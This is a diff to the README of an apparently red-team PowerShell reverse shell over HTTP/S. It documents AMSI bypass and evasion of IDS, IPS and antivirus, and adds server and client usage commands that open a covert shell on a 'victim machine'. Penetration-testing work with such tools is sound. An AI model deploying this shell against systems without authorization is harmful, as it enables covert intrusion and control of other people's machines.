@@ -1,4 +1,7 @@
 # HTTPS-RevShell-PS3
+
+[![Category-tool]]() [![Powershell]]() [![Python]]() [![License]]()
+
 Revshell focused on red teams and pentesters with AMSI Bypass. This tool provides a reverse connection through the http/s protocol. It uses a covert channel to gain control over the victim machine through web requests and thus evade solutions such as IDS, IPS and AV.
 
 # Features
@@ -11,6 +14,31 @@ Revshell focused on red teams and pentesters with AMSI Bypass. This tool provide
     Error Control
     AMSI bypass
     Autocomplete PowerShell functions (optional)
+    
+    
+# Server usage:
+```
+usage: server.py [-h] [--ssl] [--autocomplete] host port
+
+Process some integers.
+
+positional arguments:
+  host            Listen Host
+  port            Listen Port
+
+optional arguments:
+  -h, --help      show this help message and exit
+  --ssl           Send traffic over ssl
+  --autocomplete  Autocomplete powershell functions
+```
+
+## Help Invoke-WebRev.ps1 (client)
+Client usage:
+```
+Import-Module .\Invoke-WebRev.ps1
+Invoke-WebRev -ip IP -port PORT [-ssl]
+```
+
 
 # Extra functions usage
 ## Upload
@@ -58,4 +86,8 @@ Payload Generator usage:
 This script is licensed under LGPLv3+. Direct link to License.
 
 HTTP-revshell should be used for authorized penetration testing and/or nonprofit educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own servers and/or with the server owner's permission.
-`
+
+## Original Author
+This work is mosty entirely @3v4Si0N very well done job. I have made some customizations to make the code work in a few other scenarios than what was intened.
+ALL CREDITS OF THIS PROJECT GOES TO 3v4Si0N and his amazing work. You should fork his project rather than this: https://github.com/3v4Si0N/HTTP-revshell/
+
